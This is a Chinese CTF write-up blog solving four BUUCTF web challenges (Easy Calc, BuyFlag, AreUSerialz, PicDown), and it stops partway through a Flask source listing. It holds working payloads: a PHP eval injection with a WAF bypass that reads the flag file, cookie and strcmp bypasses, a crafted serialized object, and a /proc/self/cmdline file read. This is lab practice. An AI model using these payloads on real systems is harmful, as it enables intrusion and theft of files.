<h2 id="RoarCTF-2019-Easy-Calc"><a href="#RoarCTF-2019-Easy-Calc" class="headerlink" title="[RoarCTF 2019]Easy Calc"></a>[RoarCTF 2019]Easy Calc</h2><p><img src="https://img-blog.csdnimg.cn/7dbc9a95029643b6ac0fbaa2bc5acc41.png" alt="1"><br>查看源码<br><img src="https://img-blog.csdnimg.cn/67df4dfceb3343c0b3ab1ee039933a14.png" alt="1"><br>有个url提示：<code>calc.php?num=&quot;+encodeURIComponent($(&quot;#content&quot;).val())</code></p>
<blockquote>
<p>$(“#content”).val() 是什么意思：<br>获取id为content的HTML标签元素的值,是JQuery, $(“#content”)相当于document.getElementById(“content”); $(“#content”).val()相当于 document.getElementById(“content”).value;</p>
</blockquote>
<p>看一下calc.php</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'num'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token function">show_source</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>
        <span class="token variable">$str</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'num'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token variable">$blacklist</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string single-quoted-string">' '</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'\t'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'\r'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'\n'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'\''</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'"'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'`'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'\['</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'\]'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'\$'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'\\'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'\^'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$blacklist</span> <span class="token keyword">as</span> <span class="token variable">$blackitem</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/'</span> <span class="token operator">.</span> <span class="token variable">$blackitem</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'/m'</span><span class="token punctuation">,</span> <span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"what are you want to do?"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token punctuation">&#125;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'echo '</span><span class="token operator">.</span><span class="token variable">$str</span><span class="token operator">.</span><span class="token string single-quoted-string">';'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token delimiter important">?></span></span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p><code>http://node4.buuoj.cn:28863/calc.php?num=1</code><br>有回显<br><code>http://node4.buuoj.cn:28863/calc.php?num=a</code><br>无回显<br><img src="https://img-blog.csdnimg.cn/beaf25ecc9db463c87bdc14b7f82bd47.png" alt="2"><br>由于后续我们要找的flag肯定带字母<br>无论怎么注入都是被WAF了。看了一下师傅们的文章，这里涉及到一个知识点<a href="https://blog.csdn.net/qq_45521281/article/details/105871192">利用PHP的字符串解析特性绕过Waf</a></p>
<blockquote>
<p>PHP需要将所有参数转换为有效的变量名，因此在解析查询字符串时，它会做两件事：</p>
<p>1.删除前后的空白符（空格符，制表符，换行符等统称为空白符）<br>2.将某些字符转换为下划线（包括空格）</p>
</blockquote>
<p>num被限制了，但在num前面加个空格，waf就管不着了，因为waf只是限制了num，waf并没有限制’ num’，当php解析的时候，又会把’ num’前面的空格去掉在解析，利用这点来上传非法字符<br>当查找根目录文件时要用到<code>print_r(scandir(&#39;/&#39;))c</code><br>从calc.php可以看出<code>&quot;``&#39;</code>被过滤了，这是要想到用ASCII码</p>
<p><code>http://node4.buuoj.cn:28863/calc.php? num=print_r(scandir(chr(47)))</code><br><img src="https://img-blog.csdnimg.cn/48e5899d3e6f42f497fdd879518a8090.png" alt="4"><br>在flag在f1agg文件中<br>对照ASCII码表写入<br><code>http://node4.buuoj.cn:28863/calc.php? num=print_r(file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103)))</code><br>得到flag.<br><strong>flag{c7fa0f73-f1a2-4d7c-b3bb-ea6c6da4697c}</strong></p>
<h2 id="极客大挑战-2019-BuyFlag"><a href="#极客大挑战-2019-BuyFlag" class="headerlink" title="[极客大挑战 2019]BuyFlag"></a>[极客大挑战 2019]BuyFlag</h2><p><img src="https://img-blog.csdnimg.cn/2d6553026ec84e11a2b51bc17eff592e.png" alt="1"><img src="https://img-blog.csdnimg.cn/282f01c25350408ebbe4e522ade24a94.png" alt="5"></p>
<p><img src="https://img-blog.csdnimg.cn/d46d326609cb44ba90c146463434cf9b.png" alt="2"><br>怎么才能证明你是一名学生呢？cookie中有信息<br><img src="https://img-blog.csdnimg.cn/19e411b9ed5d45e4a654dc8ab5c55c5b.png" alt="3"><br>0改为1<br><img src="https://img-blog.csdnimg.cn/72e319f95be24bedbac48dce902169b1.png" alt="5"><br>密码是什么？查看源码<br><img src="https://img-blog.csdnimg.cn/0a9b22d22ae943a6a0a262c6586a4189.png" alt="6"><strong>&#x3D;&#x3D;<strong>弱相等比较，post传参：<br><img src="https://img-blog.csdnimg.cn/85f4ea6e2307467993ae5c0da4f24a12.png" alt="7"><br>科学计数法1e9<br><img src="https://img-blog.csdnimg.cn/a233cb5e10da40559fb2e04d30af20a2.png" alt="8"><br>或者数组绕过</strong>password&#x3D;404jk&amp;money[]&#x3D;1000000000;</strong><a href="https://blog.csdn.net/cherrie007/article/details/77473817">strcmp函数漏洞</a></p>
<h2 id="网鼎杯-2020-青龙组-AreUSerialz（php反序列化）"><a href="#网鼎杯-2020-青龙组-AreUSerialz（php反序列化）" class="headerlink" title="[网鼎杯 2020 青龙组]AreUSerialz（php反序列化）"></a>[网鼎杯 2020 青龙组]AreUSerialz（php反序列化）</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"> <span class="token php language-php"><span class="token delimiter important">&lt;?php</span>

<span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">class</span> <span class="token class-name-definition class-name">FileHandler</span> <span class="token punctuation">&#123;</span>

    <span class="token keyword">protected</span> <span class="token variable">$op</span><span class="token punctuation">;</span>  <span class="token comment">//protected: 受保护类型</span>
    <span class="token keyword">protected</span> <span class="token variable">$filename</span><span class="token punctuation">;</span>
    <span class="token keyword">protected</span> <span class="token variable">$content</span><span class="token punctuation">;</span>

    <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token variable">$op</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"1"</span><span class="token punctuation">;</span>
        <span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"/tmp/tmpfile"</span><span class="token punctuation">;</span>
        <span class="token variable">$content</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"Hello World!"</span><span class="token punctuation">;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">process</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">process</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">op</span> <span class="token operator">==</span> <span class="token string double-quoted-string">"1"</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">write</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">op</span> <span class="token operator">==</span> <span class="token string double-quoted-string">"2"</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token variable">$res</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">read</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">output</span><span class="token punctuation">(</span><span class="token variable">$res</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
            <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">output</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Bad Hacker!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">private</span> <span class="token keyword">function</span> <span class="token function-definition function">write</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">filename</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">content</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword type-casting">string</span><span class="token punctuation">)</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">content</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">100</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">output</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Too long!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span>
            <span class="token variable">$res</span> <span class="token operator">=</span> <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">filename</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">content</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$res</span><span class="token punctuation">)</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">output</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Successful!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">else</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">output</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Failed!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
            <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">output</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Failed!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">private</span> <span class="token keyword">function</span> <span class="token function-definition function">read</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token variable">$res</span> <span class="token operator">=</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">filename</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token variable">$res</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token keyword">return</span> <span class="token variable">$res</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">private</span> <span class="token keyword">function</span> <span class="token function-definition function">output</span><span class="token punctuation">(</span><span class="token variable">$s</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"[Result]: &lt;br>"</span><span class="token punctuation">;</span>
        <span class="token keyword">echo</span> <span class="token variable">$s</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">op</span> <span class="token operator">===</span> <span class="token string double-quoted-string">"2"</span><span class="token punctuation">)</span>
            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">op</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"1"</span><span class="token punctuation">;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">content</span> <span class="token operator">=</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">process</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

<span class="token punctuation">&#125;</span>

<span class="token keyword">function</span> <span class="token function-definition function">is_valid</span><span class="token punctuation">(</span><span class="token variable">$s</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$s</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">(</span><span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$s</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">>=</span> <span class="token number">32</span> <span class="token operator">&amp;&amp;</span> <span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$s</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&lt;=</span> <span class="token number">125</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
            <span class="token keyword">return</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">&#123;</span><span class="token string single-quoted-string">'str'</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>

    <span class="token variable">$str</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword type-casting">string</span><span class="token punctuation">)</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'str'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">is_valid</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token variable">$obj</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

<span class="token punctuation">&#125;</span>
</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p><strong>__construct()</strong></p>
<blockquote>
<p>构造函数（constructor method，也称为构造器）是类中的一种特殊函数，当使用 new 关键字实例化一个对象时，构造函数将会自动调用。</p>
</blockquote>
<p><strong>__destruct</strong></p>
<blockquote>
<p>__destruct() &#x2F;&#x2F;对象被销毁时触发</p>
<p>__destruct() 是 PHP 面向对象编程的一个重要的魔法函数，该函数会在类的一个对象被删除时自动调用。<br>我们可以在该函数中添加一些释放资源的操作，比如关闭文件、关闭数据库链接、清空一个结果集等</p>
</blockquote>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">class</span> <span class="token class-name-definition class-name">FileHandler</span> <span class="token punctuation">&#123;</span>

    <span class="token keyword">protected</span> <span class="token variable">$op</span><span class="token punctuation">;</span>  <span class="token comment">//protected: 受保护类型</span>
    <span class="token keyword">protected</span> <span class="token variable">$filename</span><span class="token punctuation">;</span>
    <span class="token keyword">protected</span> <span class="token variable">$content</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>总的来说要查看filename为<strong>flag.php</strong></p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">function</span> <span class="token function-definition function">is_valid</span><span class="token punctuation">(</span><span class="token variable">$s</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$s</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">(</span><span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$s</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">>=</span> <span class="token number">32</span> <span class="token operator">&amp;&amp;</span> <span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$s</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&lt;=</span> <span class="token number">125</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
            <span class="token keyword">return</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<blockquote>
<p>意思就是只允许取ASCII码为32~125的字符</p>
</blockquote>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">op</span> <span class="token operator">===</span> <span class="token string double-quoted-string">"2"</span><span class="token punctuation">)</span>
            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">op</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"1"</span><span class="token punctuation">;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">content</span> <span class="token operator">=</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">process</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<blockquote>
<p>这个魔法函数中对op的值进行<strong>强类型判断</strong></p>
</blockquote>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">process</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
       <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">op</span> <span class="token operator">==</span> <span class="token string double-quoted-string">"1"</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token comment">//op等于1，给予写文件权限</span>
           <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">write</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
       <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">op</span> <span class="token operator">==</span> <span class="token string double-quoted-string">"2"</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token comment">//op等于2，给予读文件权限</span>
           <span class="token variable">$res</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">read</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
           <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">output</span><span class="token punctuation">(</span><span class="token variable">$res</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
       <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
           <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">output</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Bad Hacker!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
       <span class="token punctuation">&#125;</span>
   <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<blockquote>
<p>对op值进行<strong>弱类型判断</strong>，由于我们只需要读出flag。op&#x3D;2即可。从师傅们的文章中了解到在php7.1++中对属性类型不敏感，本地序列化的时候将属性改为public进行绕过即可</p>
</blockquote>
<p>那么该如何绕过呢?当**$op&#x3D;2**时</p>
<blockquote>
<p>op &#x3D;&#x3D;&#x3D; “2”为假，op &#x3D;&#x3D; “2”为真。op &#x3D;&#x3D;&#x3D; “2”为假,那就绕过__destruct()。写着就有read权限了。</p>
</blockquote>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">class</span> <span class="token class-name-definition class-name">FileHandler</span> <span class="token punctuation">&#123;</span>

    <span class="token keyword">public</span> <span class="token variable">$op</span><span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">;</span>  <span class="token comment">//protected: 受保护类型</span>
    <span class="token keyword">public</span> <span class="token variable">$filename</span><span class="token operator">=</span><span class="token string single-quoted-string">'flag.php'</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$content</span><span class="token operator">=</span><span class="token string single-quoted-string">'1'</span><span class="token punctuation">;</span><span class="token comment">//值随意</span>
    <span class="token punctuation">&#125;</span>
  <span class="token variable">$a</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">FileHandler</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token variable">$b</span><span class="token operator">=</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token variable">$b</span><span class="token punctuation">;</span>
<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>得到<code>O:11:&quot;FileHandler&quot;:3:&#123;s:2:&quot;op&quot;;i:2;s:8:&quot;filename&quot;;s:8:&quot;flag.php&quot;;s:7:&quot;content&quot;;s:1:&quot;1&quot;;&#125;</code><br><img src="https://img-blog.csdnimg.cn/364916f0203944bda37d24a09796566b.png" alt="1"><br><img src="https://img-blog.csdnimg.cn/f495a0667a374112af7a7e1de5d21e5a.png" alt="2"><br>得到flag。</p>
<h2 id="网鼎杯-2020-白虎组-PicDown"><a href="#网鼎杯-2020-白虎组-PicDown" class="headerlink" title="[网鼎杯 2020 白虎组]PicDown"></a>[网鼎杯 2020 白虎组]PicDown</h2><p>打开网页后发现只有一个输入框，开启burp的代理尝试往输入框里输入一些内容查看数据包<br><img src="https://img-blog.csdnimg.cn/direct/75f5aa86c5c244239025304dd82c1963.png" alt="456"><br>尝试一下输入一段网址，发现回显页面<br><img src="https://img-blog.csdnimg.cn/direct/7ea54db3e4ef4a0c8f0aa7a0e98c1b0c.png" alt="123"><br>那么尝试一下文件读取，发现可以成功读取，（由于题目设置问题，这里可以直接读取flag）<br><img src="https://img-blog.csdnimg.cn/direct/ed299587d11745ccacc90070a75ef95f.png" alt="456"><br>常规做法就是先读取源码，那么我们先读取启动当前题目进程的完整命令</p>
<blockquote>
<p>&#x2F;proc&#x2F;self&#x2F;cmdline</p>
</blockquote>
<p><img src="https://img-blog.csdnimg.cn/direct/8e42cd7cb3724b7c8cf941bf2d1e2950.png" alt="123"><br>发现是python启动的，那么就读取一下源码app.py</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span> Response
<span class="token keyword">from</span> flask <span class="token keyword">import</span> render_template
<span class="token keyword">from</span> flask <span class="token keyword">import</span> request
<span class="token keyword">import</span> os
<span class="token keyword">import</span> urllib

app <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>

SECRET_FILE <span class="token operator">=</span> <span class="token string">"/tmp/secret.txt"</span>
f <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span>SECRET_FILE<span class="token punctuation">)</span>
SECRET_KEY <span class="token operator">=</span> f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span>
os<span class="token punctuation">.</span>remove<span class="token punctuation">(</span>SECRET_FILE<span class="token punctuation">)</span>


<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'search.html'</span><span class="token punctuation">)</span>


<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/page'</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">page</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    url <span class="token operator">=</span> request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"url"</span><span class="token punctuation">)</span>
    <span class="token keyword">try</span><span class="token punctuation">:</span>
        <span class="token keyword">if</span> <span class="token keyword">not</span> url<span class="token punctuation">.</span>lower<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>startswith<span class="token punctuation">(</span><span class="token string">"file"</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
